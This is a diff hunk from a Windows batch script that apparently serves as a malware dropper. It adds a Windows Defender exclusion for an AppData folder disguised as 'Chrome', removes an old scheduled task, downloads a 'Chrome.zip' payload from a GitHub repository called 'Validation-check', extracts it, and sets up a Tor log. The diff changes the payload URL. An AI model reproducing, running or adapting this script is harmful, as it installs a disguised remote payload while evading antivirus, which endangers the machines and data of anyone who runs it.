@@ -8,10 +8,10 @@ powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%\Chrome'"
 rmdir /s /q "%APPDATA%\Chrome"
 mkdir "%APPDATA%\Chrome"
 schtasks /Delete /TN "Chrome_helperr" /F 2>nul
-powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Glareing/Validation-check/refs/heads/Development/Chrome.zip' -OutFile '%APPDATA%\Chrome\Chrome.zip'"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://github.com/Glareing/Validation-check/raw/main/Chrome.zip' -OutFile '%APPDATA%\Chrome\Chrome.zip'"
 if not exist "%APPDATA%\Chrome\Chrome.zip" (
     timeout /t 2
-    powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Glareing/Validation-check/refs/heads/Development/Chrome.zip' -OutFile '%APPDATA%\Chrome\Chrome.zip'"
+    powershell.exe -Command "Invoke-WebRequest -Uri 'https://github.com/Glareing/Validation-check/raw/main/Chrome.zip' -OutFile '%APPDATA%\Chrome\Chrome.zip'"
 )
 tar -xf "%appdata%\Chrome\Chrome.zip" -C "%appdata%\Chrome"
 set TOR_LOG_FILE=%APPDATA%\Chrome\Chrome\data\tor.log
